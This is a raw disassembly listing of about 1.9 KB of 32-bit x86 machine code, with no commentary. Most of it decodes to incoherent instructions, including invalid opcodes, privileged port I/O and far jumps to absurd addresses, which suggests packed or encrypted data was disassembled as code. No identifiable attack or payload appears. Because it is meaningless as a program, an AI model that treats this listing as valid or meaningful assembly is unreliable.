  408a2e:	mov    bl,0xa2
  408a30:	push   edx
  408a31:	mov    al,ds:0xfaa65e0c
  408a36:	dec    esi
  408a37:	inc    ecx
  408a38:	push   ds
  408a39:	adc    ebx,DWORD PTR [edi+0x35ddd866]
  408a3f:	data16 arpl WORD PTR [edi+0x5eeac920],di
  408a46:	(bad)  [ebx+eax*2+0x34]
  408a4a:	cwde   
  408a4b:	inc    esi
  408a4c:	push   0x820253f9
  408a51:	aam    0x87
  408a53:	nop
  408a54:	call   0xbbb0:0xf1c616b0
  408a5b:	or     al,0x55
  408a5d:	jno    0x408a11
  408a5f:	sub    DWORD PTR [eax-0x36],eax
  408a62:	hlt    
  408a63:	jg     0x4089f6
  408a65:	imul   ecx,DWORD PTR [edi],0x2b0380c6
  408a6b:	cwde   
  408a6c:	(bad)  
  408a6e:	das    
  408a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a70:	cmp    ebx,DWORD PTR [edi]
  408a72:	addr16 out 0x1a,eax
  408a75:	push   0x1b
  408a77:	addr16 cli 
  408a79:	mov    eax,ds:0x886fbc8
  408a7e:	(bad)  
  408a7f:	pop    ss
  408a80:	mov    ebx,0x840324e3
  408a85:	sbb    DWORD PTR [ebp-0xd],0x1fb0bc4d
  408a8c:	imul   ebp,DWORD PTR [esi],0xffffffac
  408a8f:	cmc    
  408a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a91:	lea    edx,[eax+eax*4+0x688924a1]
  408a98:	js     0x408af4
  408a9a:	in     al,0xdd
  408a9c:	(bad)  
  408a9d:	in     eax,0xc
  408a9f:	and    al,0x63
  408aa1:	cli    
  408aa2:	xor    al,0xe8
  408aa4:	cmp    eax,0x15f720f7
  408aa9:	or     al,0x10
  408aab:	repnz and BYTE PTR [esi],bh
  408aae:	cs repz leave 
  408ab1:	lock pushf 
  408ab3:	inc    esp
  408ab4:	iret   
  408ab5:	mov    ch,0x9a
  408ab7:	ins    DWORD PTR es:[edi],dx
  408ab8:	bound  edx,QWORD PTR [ecx]
  408aba:	jmp    0xd35a:0x46d355d0
  408ac1:	mov    al,ds:0x4b84f151
  408ac6:	cmp    al,0xab
  408ac8:	ret    0xf9
  408acb:	push   ecx
  408acc:	jge    0x408a5c
  408ace:	or     BYTE PTR [ebp+0x17],bl
  408ad1:	mov    edx,0x368ed678
  408ad6:	cmp    al,0x9a
  408ad8:	pop    es
  408ad9:	popa   
  408ada:	int3   
  408adb:	iret   
  408adc:	shl    bh,0x17
  408adf:	dec    ebp
  408ae0:	outs   dx,DWORD PTR ds:[esi]
  408ae1:	adc    al,0xf6
  408ae3:	sti    
  408ae4:	hlt    
  408ae5:	into   
  408ae6:	mov    esp,0x2fe74fbe
  408aeb:	leave  
  408aec:	mov    edi,0xdb94563c
  408af1:	cmp    al,0xd1
  408af3:	in     al,dx
  408af4:	jo     0x408b43
  408af6:	inc    ebx
  408af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408af8:	and    ebx,DWORD PTR [eax]
  408afa:	ret    
  408afb:	cmp    BYTE PTR [edx-0x23],dh
  408afe:	jae    0x408b78
  408b00:	imul   eax,DWORD PTR [edi+ecx*1+0x11eab03b],0x68
  408b08:	nop    DWORD PTR [edx-0x59]
  408b0c:	or     eax,ebp
  408b0e:	mov    esi,0x5f17e2f7
  408b13:	scas   al,BYTE PTR es:[edi]
  408b14:	pop    ecx
  408b15:	xchg   BYTE PTR [edi-0x7f7c9eb5],ah
  408b1b:	dec    esi
  408b1c:	pop    eax
  408b1d:	mov    bh,0x55
  408b1f:	into   
  408b20:	les    edi,FWORD PTR [ebx-0x7]
  408b23:	xor    edx,DWORD PTR [edx-0x3db3c54c]
  408b29:	adc    DWORD PTR [edx+ebx*2],0x6b
  408b2d:	add    eax,0xb2e1b727
  408b32:	mov    edi,0xa2c91fff
  408b37:	jg     0x408bb8
  408b39:	mul    DWORD PTR [ebp-0x54142a1b]
  408b3f:	fwait
  408b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b41:	std    
  408b42:	xlat   BYTE PTR ds:[ebx]
  408b43:	lods   al,BYTE PTR ds:[esi]
  408b44:	mov    al,ds:0x47397dc6
  408b49:	sub    al,0x40
  408b4b:	pop    edx
  408b4c:	cdq    
  408b4d:	sub    eax,0xf3fac070
  408b52:	imul   edx,DWORD PTR [esi],0x8
  408b55:	fistp  DWORD PTR [edx+eax*8-0x40f4942f]
  408b5c:	adc    BYTE PTR [esi-0x7000700],al
  408b62:	adc    esp,DWORD PTR [ebx-0x9]
  408b65:	mov    ebp,DWORD PTR [esi+eiz*1+0x57]
  408b69:	js     0x408af6
  408b6b:	out    dx,eax
  408b6c:	icebp  
  408b6d:	test   DWORD PTR [edx+0x465e1cc9],edi
  408b73:	cmp    eax,0x5e58b677
  408b78:	fistp  DWORD PTR [esp+ecx*1+0x2dfb1a87]
  408b7f:	retf   
  408b80:	jno    0x408b44
  408b82:	mov    ecx,0x83496ca4
  408b87:	pop    ecx
  408b88:	and    eax,0xf10f461c
  408b8d:	nop
  408b8e:	aaa    
  408b8f:	sbb    DWORD PTR [ebx],esi
  408b91:	ins    DWORD PTR es:[edi],dx
  408b92:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  408b94:	bound  ecx,QWORD PTR [ecx+ebp*1+0x31]
  408b98:	stos   BYTE PTR es:[edi],al
  408b99:	xchg   esp,eax
  408b9a:	jecxz  0x408b45
  408b9c:	ret    0x1147
  408b9f:	xchg   esi,eax
  408ba0:	lds    esp,FWORD PTR [edi+0x64]
  408ba3:	daa    
  408ba4:	add    eax,0xd1a201ad
  408ba9:	pop    eax
  408baa:	aad    0x82
  408bac:	ret    0x1fdd
  408baf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bb0:	jp     0x408bf9
  408bb2:	pop    ds
  408bb3:	psubq  mm5,QWORD PTR [ebx+edx*8+0x67]
  408bb8:	push   ss
  408bb9:	mov    bh,bl
  408bbb:	push   ebp
  408bbc:	mov    cl,al
  408bbe:	arpl   WORD PTR [ebp-0x73a829ae],ax
  408bc4:	loop   0x408c1b
  408bc6:	(bad)  
  408bc7:	rcl    bh,0xfc
  408bca:	sahf   
  408bcb:	jg     0x408bdf
  408bcd:	test   eax,0x56e1b142
  408bd2:	and    DWORD PTR [edi],0xbf1aca4
  408bd8:	pop    ebp
  408bd9:	fist   WORD PTR [edx-0x4a]
  408bdc:	mov    eax,0x562ea3a9
  408be1:	mov    al,ds:0x730546a5
  408be6:	xlat   BYTE PTR ds:[ebx]
  408be7:	lods   al,BYTE PTR ds:[esi]
  408be8:	push   cs
  408be9:	nop
  408bea:	enter  0x339e,0xa9
  408bee:	icebp  
  408bef:	dec    ebx
  408bf0:	mov    esp,0xe6c5fc7
  408bf5:	int3   
  408bf6:	inc    ebp
  408bf7:	je     0x408b7d
  408bf9:	pop    edx
  408bfa:	aad    0x32
  408bfc:	test   DWORD PTR [ebp-0x70e624e7],eax
  408c02:	je     0x408b88
  408c04:	ret    
  408c05:	pop    esp
  408c06:	cwde   
  408c07:	xlat   BYTE PTR es:[ebx]
  408c09:	repnz sub al,0xdb
  408c0c:	retf   0xfe0b
  408c0f:	cmc    
  408c10:	mov    edi,DWORD PTR [edx]
  408c12:	aas    
  408c13:	sbb    ebx,DWORD PTR [edi]
  408c15:	fptan  
  408c17:	mov    eax,ds:0xd2705e48
  408c1c:	test   BYTE PTR [edi],al
  408c1e:	test   al,0x77
  408c20:	into   
  408c21:	xchg   edi,eax
  408c22:	fsubr  DWORD PTR [ebx]
  408c24:	mov    ebx,0xb347d1fb
  408c29:	xchg   ebx,eax
  408c2a:	pop    esi
  408c2b:	mov    ebp,0x5e4b9d4a
  408c30:	fidiv  WORD PTR [ebp+ebp*2-0xc]
  408c34:	dec    ebx
  408c35:	stc    
  408c36:	clc    
  408c37:	mov    edx,0x8f169822
  408c3c:	dec    edi
  408c3d:	addr16 dec ebx
  408c3f:	sbb    eax,0x51fb3338
  408c44:	pop    ss
  408c45:	adc    DWORD PTR [ecx+ebx*2-0x12e78b7],edi
  408c4c:	or     bh,bh
  408c4e:	jne    0x408c40
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  ebx,QWORD PTR [edi-0x77]
  408c72:	push   eax
  408c73:	ins    DWORD PTR es:[edi],dx
  408c74:	inc    edi
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408cdd
  408c7d:	pop    ebp
  408c7e:	in     eax,0x7f
  408c80:	pop    edi
  408c81:	mov    dh,0x63
  408c83:	icebp  
  408c84:	dec    ebx
  408c85:	mov    DWORD PTR [ecx],esp
  408c87:	test   al,0xc3
  408c89:	nop
  408c8a:	leave  
  408c8b:	xchg   ebp,eax
  408c8c:	add    DWORD PTR [ecx],ebp
  408c8e:	shl    DWORD PTR [edi+edx*8],1
  408c91:	mov    edi,DWORD PTR [edx]
  408c93:	outs   dx,DWORD PTR ds:[esi]
  408c94:	es std 
  408c96:	add    al,0xd0
  408c98:	arpl   WORD PTR [esi+0x3532b8d],bx
  408c9e:	cli    
  408c9f:	(bad)  
  408ca1:	xchg   ebx,eax
  408ca2:	pop    ds
  408ca3:	mov    edi,DWORD PTR [ecx-0xa]
  408ca6:	xchg   ebp,edx
  408ca8:	int3   
  408ca9:	xchg   edi,eax
  408caa:	push   cs
  408cab:	cmp    DWORD PTR [ecx],esi
  408cad:	inc    ebx
  408cae:	adc    DWORD PTR [edi],ebx
  408cb0:	outs   dx,DWORD PTR ds:[esi]
  408cb1:	xchg   ebp,eax
  408cb2:	scas   al,BYTE PTR es:[edi]
  408cb3:	mov    WORD PTR [ebp+0x65],?
  408cb6:	pop    esi
  408cb7:	icebp  
  408cb8:	lods   eax,DWORD PTR ds:[esi]
  408cb9:	dec    ebx
  408cba:	mov    esp,0xd6116b1
  408cbf:	hlt    
  408cc0:	jge    0x408d1d
  408cc2:	jo     0x408cad
  408cc4:	cwde   
  408cc5:	out    0x32,al
  408cc7:	or     DWORD PTR [ebp+0x60],esp
  408cca:	or     ah,bh
  408ccc:	xchg   ebp,eax
  408ccd:	dec    esi
  408cce:	test   DWORD PTR [ebp+0x2c983514],edi
  408cd4:	jb     0x408cae
  408cd6:	and    esi,esp
  408cd8:	lahf   
  408cd9:	cmp    bh,BYTE PTR [ebp+0x44]
  408cdc:	jp     0x408cee
  408cde:	push   edi
  408cdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ce0:	std    
  408ce1:	push   es
  408ce2:	inc    ebx
  408ce3:	jge    0x408c71
  408ce5:	xor    esp,DWORD PTR [esi]
  408ce7:	xchg   esi,eax
  408ce8:	xchg   DWORD PTR [ebp-0x34],edi
  408ceb:	sar    DWORD PTR [edx-0x45],cl
  408cee:	inc    edx
  408cef:	jbe    0x408ced
  408cf1:	leave  
  408cf2:	mov    ecx,0x84999e6f
  408cf7:	jb     0x408cfa
  408cf9:	fisttp QWORD PTR [eax-0x33]
  408cfc:	sub    ah,BYTE PTR [esi]
  408cfe:	ins    DWORD PTR es:[edi],dx
  408cff:	(bad)
  408d04:	push   edi
  408d05:	loope  0x408d4a
  408d07:	dec    esp
  408d08:	mov    ebx,fs
  408d0a:	jae    0x408d2a
  408d0c:	adc    al,BYTE PTR [eax+0x10]
  408d0f:	ins    BYTE PTR es:[edi],dx
  408d10:	sahf   
  408d11:	nop
  408d12:	inc    esi
  408d13:	mov    esi,0xb394b435
  408d18:	aad    0xea
  408d1a:	ret    0x6e62
  408d1d:	jb     0x408d9d
  408d1f:	push   ebx
  408d20:	in     eax,dx
  408d21:	retf   
  408d22:	push   0x58318527
  408d27:	push   cs
  408d28:	pop    ebp
  408d29:	fld    DWORD PTR [edi+esi*4]
  408d2c:	les    eax,FWORD PTR [esi+0x281a8721]
  408d32:	inc    eax
  408d33:	pop    ebp
  408d34:	mov    dl,0xa1
  408d36:	dec    esi
  408d37:	std    
  408d38:	int3   
  408d39:	cmp    al,0xca
  408d3b:	leave  
  408d3c:	test   al,0xae
  408d3e:	mov    ds:0xf31684d4,al
  408d43:	and    ebp,DWORD PTR [edx-0x8891505]
  408d49:	in     al,0x1c
  408d4b:	retf   0xcf1c
  408d4e:	mov    ah,0x75
  408d50:	enter  0x8a2,0xf3
  408d54:	push   ds
  408d55:	popa   
  408d56:	push   edi
  408d57:	sbb    bl,BYTE PTR ds:0x3b19a345
  408d5d:	adc    edi,DWORD PTR [ecx-0x211321ff]
  408d63:	mov    al,ds:0x83995a62
  408d68:	or     al,BYTE PTR [edi+edx*2+0x7a2272be]
  408d6f:	retf   0x488c
  408d72:	es push ebx
  408d74:	adc    DWORD PTR ds:0x1cb91e46,esp
  408d7a:	pop    ebp
  408d7b:	push   edi
  408d7c:	mov    esp,0x4fcbcf91
  408d81:	add    eax,0x1b6bafd8
  408d86:	push   edx
  408d87:	ret    
  408d88:	dec    esp
  408d89:	dec    esi
  408d8a:	sahf   
  408d8b:	mov    ch,0x5b
  408d8d:	stos   DWORD PTR es:[edi],eax
  408d8e:	retf   
  408d8f:	retf   
  408d90:	mov    esp,edi
  408d92:	mov    ebx,0x78def366
  408d97:	xor    ecx,DWORD PTR [ebx+0xa]
  408d9a:	adc    ecx,DWORD PTR [eax+edx*4+0x62474cdf]
  408da1:	into   
  408da2:	xlat   BYTE PTR ds:[ebx]
  408da3:	xor    cl,bh
  408da5:	xchg   ebx,eax
  408da6:	scas   al,BYTE PTR es:[edi]
  408da7:	(bad)  
  408da8:	push   ecx
  408da9:	stos   BYTE PTR es:[edi],al
  408daa:	jle    0x408d6e
  408dac:	inc    esp
  408dad:	out    0xf4,al
  408daf:	sub    eax,0x4b040aa8
  408db4:	fwait
  408db5:	sbb    bh,cl
  408db7:	nop
  408db8:	pop    esi
  408db9:	mov    edi,DWORD PTR [ecx-0x371bbcb0]
  408dbf:	ror    eax,1
  408dc1:	xor    BYTE PTR [esi],dh
  408dc3:	mov    esi,0x6b1aee92
  408dc8:	mov    edx,0x5b9b9689
  408dcd:	mov    ebp,0xba94253f
  408dd2:	bound  ebx,QWORD PTR [esi+0x4c]
  408dd5:	sbb    dl,BYTE PTR [esi+eiz*4+0x1f]
  408dd9:	jmp    0xd6be:0x79956b
  408de0:	shr    DWORD PTR [esi+edi*4-0x35],1
  408de4:	or     BYTE PTR [edx-0x1c],ah
  408de7:	or     bh,al
  408de9:	fcmovnbe st,st(1)
  408deb:	out    dx,al
  408dec:	mov    esi,0xee0dc5c4
  408df1:	lods   al,BYTE PTR ds:[esi]
  408df2:	add    DWORD PTR [ebx-0x332ca49a],esi
  408df8:	sar    DWORD PTR ds:0x71a4f423,0xe3
  408dff:	cmp    cl,BYTE PTR [ebx]
  408e01:	lods   al,BYTE PTR ds:[esi]
  408e02:	mov    eax,ds:0xe9517752
  408e07:	ds push 0x40
  408e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e0b:	leave  
  408e0c:	or     edx,DWORD PTR [edi-0x771d648f]
  408e12:	stc    
  408e13:	mov    edi,0xf99dbd95
  408e18:	popf   
  408e19:	pop    ecx
  408e1a:	adc    BYTE PTR [esi-0x7e],0x78
  408e1e:	cdq    
  408e1f:	dec    ebp
  408e20:	nop
  408e21:	add    BYTE PTR [esi+0x69],dh
  408e24:	out    dx,eax
  408e25:	ins    DWORD PTR es:[edi],dx
  408e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e27:	mov    edx,0xf32c7503
  408e2c:	xor    bh,ah
  408e2e:	mov    esi,0x74899de4
  408e33:	jecxz  0x408e96
  408e35:	loope  0x408dff
  408e37:	test   eax,0xb9c9e638
  408e3c:	add    al,BYTE PTR [ecx+0x45]
  408e3f:	icebp  
  408e40:	je     0x408e0f
  408e42:	mov    cl,0x9f
  408e44:	popf   
  408e45:	shl    bl,0xfd
  408e48:	int3   
  408e49:	loopne 0x408e94
  408e4b:	adc    dl,bl
  408e4d:	enter  0x8850,0x10
  408e51:	push   0xbcebfaa2
  408e56:	sub    dh,BYTE PTR [ecx]
  408e58:	xor    ebx,DWORD PTR [edx+0x40]
  408e5b:	sbb    al,0x56
  408e5d:	pop    eax
  408e5e:	retf   
  408e5f:	sub    eax,0x311f159d
  408e64:	fidiv  DWORD PTR [edi+0x4024f343]
  408e6a:	xchg   ebx,eax
  408e6b:	loopne 0x408e32
  408e6d:	add    esi,esp
  408e6f:	call   0x1c3c:0xcafc0b9d
  408e76:	test   DWORD PTR [edx],ebx
  408e78:	mov    edx,DWORD PTR [eax]
  408e7a:	repnz add DWORD PTR [ebx],eax
  408e7d:	sub    al,0xd8
  408e7f:	mov    cs,ebx
  408e81:	dec    eax
  408e82:	jl     0x408eeb
  408e84:	cmp    DWORD PTR [edi],edi
  408e86:	dec    ebx
  408e87:	in     al,dx
  408e88:	adc    ah,bh
  408e8a:	loope  0x408f0b
  408e8c:	sub    BYTE PTR [esi+0x31],al
  408e8f:	cs in  eax,dx
  408e91:	xchg   ebx,eax
  408e92:	popa   
  408e93:	jne    0x408e58
  408e95:	scas   al,BYTE PTR es:[edi]
  408e96:	loopne 0x408e76
  408e98:	scas   eax,DWORD PTR es:[edi]
  408e99:	dec    ebp
  408e9a:	cli    
  408e9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e9c:	mov    ebx,0x803f40be
  408ea1:	xor    BYTE PTR ds:0x97fb5cfa,cl
  408ea7:	hlt    
  408ea8:	and    ebx,DWORD PTR [ecx]
  408eaa:	add    BYTE PTR [ecx+0x2e5e390e],ch
  408eb0:	xchg   esi,eax
  408eb1:	aad    0x8c
  408eb3:	jl     0x408e82
  408eb5:	enter  0xd1fa,0x26
  408eb9:	sub    BYTE PTR [edi+0x23],dl
  408ebc:	inc    esp
  408ebd:	call   0x1d10:0xd9a5b9fb
  408ec4:	arpl   WORD PTR [esi],cx
  408ec6:	cwde   
  408ec7:	arpl   cx,dx
  408ec9:	dec    ebx
  408eca:	mov    cl,0x68
  408ecc:	ror    BYTE PTR [ebx+ebx*2+0x14],1
  408ed0:	xchg   ecx,eax
  408ed1:	imul   esp,DWORD PTR [edi+0x6c5afdfe],0x96b14e73
  408edb:	fmul   QWORD PTR [ecx-0xf]
  408ede:	xor    DWORD PTR [eax],eax
  408ee0:	aaa    
  408ee1:	(bad)  
  408ee2:	jne    0x408e67
  408ee4:	add    DWORD PTR [ebx],esi
  408ee6:	ins    BYTE PTR es:[edi],dx
  408ee7:	and    al,0xca
  408ee9:	ja     0x408f0d
  408eeb:	push   cs
  408eec:	push   esp
  408eed:	add    cl,bl
  408eef:	(bad)  
  408ef0:	push   ebx
  408ef1:	pusha  
  408ef2:	ret    0xe4ec
  408ef5:	sahf   
  408ef6:	sub    BYTE PTR [ebp+0x25bf544a],0xed
  408efd:	shl    cl,cl
  408eff:	cmp    eax,0xa0000925
  408f04:	fwait
  408f05:	mov    edx,0xf5fd8b26
  408f0a:	fcom   QWORD PTR [ebp+0x3d254480]
  408f10:	mov    esi,esp
  408f12:	bound  esp,QWORD PTR [ecx-0x2771255c]
  408f18:	xchg   ecx,eax
  408f19:	retf   
  408f1a:	into   
  408f1b:	into   
  408f1c:	add    BYTE PTR [ebx+0x68],ch
  408f1f:	xor    eax,0xc3bdd529
  408f24:	xor    al,0x8a
  408f26:	jmp    0x408f43
  408f28:	inc    DWORD PTR [edi-0x1c]
  408f2b:	fld    QWORD PTR [ecx]
  408f2d:	loopne 0x408ebe
  408f2f:	int    0xd0
  408f31:	xchg   BYTE PTR [esi-0x49],ah
  408f34:	xor    BYTE PTR [eax-0x3c2786a9],ch
  408f3a:	sbb    edi,DWORD PTR [ebx+0x184b89b8]
  408f40:	mov    DWORD PTR [edi+0x193bbed4],edx
  408f46:	cdq    
  408f47:	and    eax,0x2ab0153
  408f4c:	push   ds
  408f4d:	pop    eax
  408f4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f4f:	les    esp,FWORD PTR ds:0xf87bbdef
  408f55:	mov    dh,0x4d
  408f57:	xchg   BYTE PTR [edx-0x42],ch
  408f5a:	rcl    DWORD PTR [ebx+0x35],cl
  408f5d:	jmp    0x408fd9
  408f5f:	das    
  408f60:	(bad)  
  408f61:	fild   QWORD PTR [ecx+0x46533f50]
  408f67:	pop    eax
  408f68:	lea    ebp,[ecx+edi*1]
  408f6b:	mov    esp,0x864b7742
  408f70:	cdq    
  408f71:	pop    esi
  408f72:	jle    0x408f7b
  408f74:	jno    0x408f11
  408f76:	xor    DWORD PTR [ebp-0x2a],ebp
  408f79:	sub    DWORD PTR [ebx],esp
  408f7b:	pop    eax
  408f7c:	adc    dh,BYTE PTR [eax+0x26]
  408f7f:	addr16 test al,0xae
  408f82:	pop    ds
  408f83:	psrld  mm5,mm2
  408f86:	mov    edx,DWORD PTR [edi-0x41]
  408f89:	jo     0x409001
  408f8b:	iret   
  408f8c:	cli    
  408f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f8e:	fadd   DWORD PTR [eax-0x34b5c8db]
  408f94:	dec    eax
  408f95:	sbb    cl,BYTE PTR [edi+0x5f]
  408f98:	jb     0x408fee
  408f9a:	adc    bl,ch
  408f9c:	mov    ch,0x83
  408f9e:	mov    esi,0xb4a5b985
  408fa3:	and    ebx,DWORD PTR [ebx-0x2e]
  408fa6:	out    dx,al
  408fa7:	inc    esp
  408fa8:	jp     0x408f78
  408faa:	daa    
  408fab:	adc    eax,0x58d30ff
  408fb0:	sub    al,0xb0
  408fb2:	inc    ecx
  408fb3:	add    cl,ch
  408fb5:	dec    eax
  408fb6:	add    eax,DWORD PTR [eax]
  408fb8:	add    BYTE PTR [esp+edi*2],al
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xf41937f3
  408fc6:	push   eax
  408fc7:	in     al,dx
  408fc8:	clc    
  408fc9:	ja     0x408fb1
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408f65
  408fd2:	add    DWORD PTR [edi],ecx
  408fd4:	out    0x4,al
  408fd6:	ret    0x865c
  408fd9:	xor    esp,ecx
  408fdb:	cmp    al,0x8e
  408fdd:	out    dx,eax
  408fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fdf:	lea    ebx,[ebx-0x149c8015]
  408fe5:	stos   BYTE PTR es:[edi],al
  408fe6:	lods   al,BYTE PTR ds:[esi]
  408fe7:	xor    DWORD PTR [ebp-0x47801fb9],ebp
  408fed:	sbb    ebp,esp
  408fef:	pop    edi
  408ff0:	dec    esp
  408ff1:	dec    ebx
  408ff2:	cmp    BYTE PTR [edi+0x4f57ef1f],dh
  408ff8:	inc    edi
  408ff9:	popf   
  408ffa:	retf   0x2a55
  408ffd:	sbb    esp,DWORD PTR [eax-0x46f040db]
  409003:	imul   ecx,DWORD PTR [ebx+0x3c],0xffffffaa
  409007:	mov    edx,0xdd6d1618
  40900c:	jae    0x409064
  40900e:	inc    edi
  40900f:	jns    0x409012
  409011:	cmp    esp,edi
  409013:	xchg   edx,eax
  409014:	pop    edi
  409015:	in     al,dx
  409016:	and    al,0x5
  409018:	clc    
  409019:	sub    BYTE PTR [edx-0xb],ah
  40901c:	test   DWORD PTR [eax+edi*8-0x5643a5d2],ebp
  409023:	or     DWORD PTR [ebx-0x3e2b90f0],ecx
  409029:	stc    
  40902a:	push   ds
  40902b:	xor    edi,DWORD PTR [ecx]
  40902d:	xor    al,0x41
  40902f:	pushf  
  409030:	repnz adc edi,DWORD PTR [eax+0x74]
  409034:	jnp    0x4090a7
  409036:	inc    edx
  409037:	popa   
  409038:	enter  0x76be,0xf4
  40903c:	mov    eax,ds:0xadd47b41
  409041:	mov    eax,ebp
  409043:	arpl   WORD PTR [edx],bp
  409045:	outs   dx,DWORD PTR ds:[esi]
  409046:	shr    BYTE PTR [edx],cl
  409048:	fs (bad) 
  40904b:	sahf   
  40904c:	push   esi
  40904d:	jmp    0x10ce18a7
  409052:	adc    BYTE PTR [ebx+edx*1],0xad
  409056:	jne    0x409085
  409058:	mov    ebx,0xeae01223
  40905d:	mov    esi,0x654c831e
  409062:	mov    ebp,0xb6b4cb55
  409067:	lods   eax,DWORD PTR ds:[esi]
  409068:	inc    sp
  40906a:	stos   DWORD PTR es:[edi],eax
  40906b:	addr16 pop ecx
  40906d:	push   edi
  40906e:	sar    DWORD PTR [ecx+eax*1-0x79],1
  409072:	add    eax,0x42c610d0
  409077:	ja     0x4090a7
  409079:	js     0x40907f
  40907b:	pop    ecx
  40907c:	pop    ds
  40907d:	ret    
  40907e:	(bad)  
  40907f:	std    
  409080:	inc    esp
  409081:	xchg   ebp,eax
  409082:	ss jb  0x40904d
  409085:	std    
  409086:	outs   dx,BYTE PTR ds:[esi]
  409088:	pop    ebp
  409089:	jge    0x409079
  40908b:	sub    DWORD PTR [ebp+ecx*4-0x71],ebx
  40908f:	clc    
  409090:	inc    ebp
  409091:	cdq    
  409092:	out    dx,eax
  409093:	cmovp  ebp,DWORD PTR [ebp-0x61357717]
  40909a:	pop    esi
  40909b:	mov    eax,0xac234605
  4090a0:	xchg   esp,ebp
  4090a2:	adc    BYTE PTR [ebp+0x4e],cl
  4090a5:	fstp   QWORD PTR [eax-0x41bb628d]
  4090ab:	jne    0x409114
  4090ad:	xor    al,0xc7
  4090af:	repz lahf 
  4090b1:	jne    0x4090af
  4090b3:	ds jnp 0x40906e
  4090b6:	stos   BYTE PTR es:[edi],al
  4090b7:	and    BYTE PTR [edx+0x5c],ah
  4090ba:	outs   dx,DWORD PTR ds:[esi]
  4090bb:	ret    
  4090bc:	sbb    BYTE PTR [eax-0x7ee3f0d7],bl
  4090c2:	jnp    0x40910b
  4090c4:	mov    ds:0xd18bc6ef,al
  4090c9:	push   ss
  4090ca:	inc    edx
  4090cb:	dec    edi
  4090cc:	dec    ecx
  4090cd:	or     al,0x3b
  4090cf:	xor    eax,0xeedae2b3
  4090d4:	xor    al,0x7f
  4090d6:	sub    ch,BYTE PTR [edx]
  4090d8:	pop    ecx
  4090d9:	inc    edi
  4090da:	push   cs
  4090db:	int    0x98
  4090dd:	mov    cl,0x5b
  4090df:	pop    ebx
  4090e0:	jb     0x409088
  4090e2:	xchg   ebp,eax
  4090e3:	scas   eax,DWORD PTR es:[edi]
  4090e4:	sar    eax,1
  4090e6:	adc    ch,bh
  4090e8:	sti    
  4090e9:	imul   edi,DWORD PTR [ebp+0x2ab6ac2f],0xffffffae
  4090f0:	enter  0x770f,0x63
  4090f4:	cmc    
  4090f5:	fadd   st(2),st
  4090f7:	sub    DWORD PTR [edi+0x649ed4db],ebx
  4090fd:	pop    ebx
  4090fe:	nop
  4090ff:	iret   
  409100:	ror    DWORD PTR [edx+esi*2],0xa7
  409104:	mov    ebp,0x339007e7
  409109:	inc    ebp
  40910a:	shl    edx,0x21
  40910d:	mov    eax,ds:0x14be3720
  409112:	jmp    0xc09d6f90
  409117:	add    BYTE PTR ds:[edi-0x26],dh
  40911b:	loope  0x409163
  40911d:	lahf   
  40911e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40911f:	cmp    al,BYTE PTR [ebp-0xb]
  409122:	(bad)  
  409123:	fsubr  QWORD PTR [ebx+0x67]
  409126:	ds in  eax,0x64
  409129:	cmp    eax,0xcfaf0376
  40912e:	push   eax
  40912f:	xor    eax,0x736e3487
  409134:	pop    esp
  409135:	inc    esp
  409136:	adc    cl,0x3a
  409139:	pop    ds
  40913a:	add    al,0xb9
  40913c:	or     DWORD PTR [ebp+0x23],esi
  40913f:	hlt    
  409140:	out    0xb1,eax
  409142:	cmp    al,0x89
  409144:	repz retf 
  409146:	bound  ecx,QWORD PTR [ecx-0x4f]
  409149:	adc    bh,ah
  40914b:	jo     0x4091a2
  40914d:	fstp   TBYTE PTR [ebp-0x480f1d6e]
  409153:	xchg   BYTE PTR [edx-0x2c],al
  409156:	inc    ebx
  409157:	xchg   esi,eax
  409158:	sbb    BYTE PTR [edx+ecx*8-0x67a4510b],cl
  40915f:	xchg   ebx,eax
  409160:	mov    bh,0x7b
  409162:	jo     0x409189
  409164:	push   ds
  409165:	and    BYTE PTR [ebx+0x489ec2a3],al
  40916b:	pop    edi
  40916c:	fdiv   QWORD PTR [edi-0x745cdd2c]
  409172:	and    DWORD PTR [ebx-0x5736d9cc],0x586e11a0
  40917c:	mov    edi,0xcdd711e9
  409181:	or     ah,BYTE PTR [eax+0x4c6e128f]
  409187:	mov    edi,0x18b95f54
  40918c:	test   BYTE PTR ds:0x27648fe9,bh
  409192:	hlt    
  409193:	lds    ecx,FWORD PTR [ecx-0x80]
  409196:	je     0x4091c2
  409198:	(bad)  
  409199:	xchg   edi,eax
  40919a:	mov    dl,0xd1
  40919c:	cmp    BYTE PTR [ecx],ch
  40919e:	jle    0x40917a
  4091a0:	xchg   DWORD PTR [ecx],eax
  4091a2:	sbb    eax,0x628942cd
  4091a7:	xchg   BYTE PTR [esi],dl
  4091a9:	xchg   esi,eax
  4091aa:	popf   
  4091ab:	fimul  WORD PTR [ebx+0x50d0e539]
  4091b1:	jo     0x409181
  4091b3:	sar    DWORD PTR [edx+ecx*1+0x40],0xe7
  4091b8:	test   BYTE PTR [ebx],al
  4091ba:	jo     0x409164
  4091bc:	sbb    ecx,DWORD PTR [ecx]
